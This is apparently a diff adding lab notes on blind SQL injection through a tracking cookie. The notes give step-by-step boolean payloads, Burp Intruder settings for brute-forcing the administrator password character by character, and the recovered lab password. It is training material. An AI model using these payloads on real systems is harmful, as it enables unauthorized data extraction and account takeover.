@@ -1,0 +1,46 @@
+Blind SQL injection with conditional responses
+
+Vulnerable parameter: tracking cookie
+
+Goals:
+1. Enumerate the password of the administrator
+2. Log in as the administrator user
+
+Analysis:
+---------
+
+==========Step 1: Confirm that the parameter is vulnerable to blind SQLi==========
+select tracking-id from tracking-table where trackingId = 'c7Pu3nV9N9wYd7M8'
+-> If this tracking id exists -> query returns value -> Welcome back message
+-> If the tracking id doesn't exist -> query returns nothing -> no Welcome back message
+
+select tracking-id from tracking-table where trackingId = 'c7Pu3nV9N9wYd7M8' and 1=1--
+-> TRUE -> Welcome back
+
+select tracking-id from tracking-table where trackingId = 'c7Pu3nV9N9wYd7M8' and 1=0--
+-> FALSE -> no Welcome back
+
+==========Step 2: Confirm that we have a users table==========
+select tracking-id from tracking-table where trackingId = 'c7Pu3nV9N9wYd7M8' and (select 'x' from users LIMIT 1)='x'--
+-> users table exists in the database. If we have 5 users, we will get five 'x'.
+
+==========Step 3: Confirm that username administrator exists users table==========
+select tracking-id from tracking-table where trackingId = 'c7Pu3nV9N9wYd7M8' and (select username from users where username='administrator')='administrator'--
+-> administrator user exists
+
+==========Step 4: Enumerate the password of the administrator user==========
+---Make use of Burp Intruder, use payload type Numbers---
+select tracking-id from tracking-table where trackingId = 'c7Pu3nV9N9wYd7M8' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--
+-> Length 5511
+...
+select tracking-id from tracking-table where trackingId = 'c7Pu3nV9N9wYd7M8' and (select username from users where username='administrator' and LENGTH(password)>20)='administrator'--
+-> Length 5450, Indication that something is wrong
+-> password is exactly 20 characters
+
+---Make use of Burp Intruder, use Attack type Cluster bomb, and Payload type for the first payload('1') Numbers and for the second payload('a') use Brute forcer---
+select tracking-id from tracking-table where trackingId = 'c7Pu3nV9N9wYd7M8' and (select substring(password,1,1) from users where username='administrator')='a'--
+
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+i f 3 k x g 5 w c 4  q  s  y  a  2  e  4  o  t  v
+
+script.py <url>
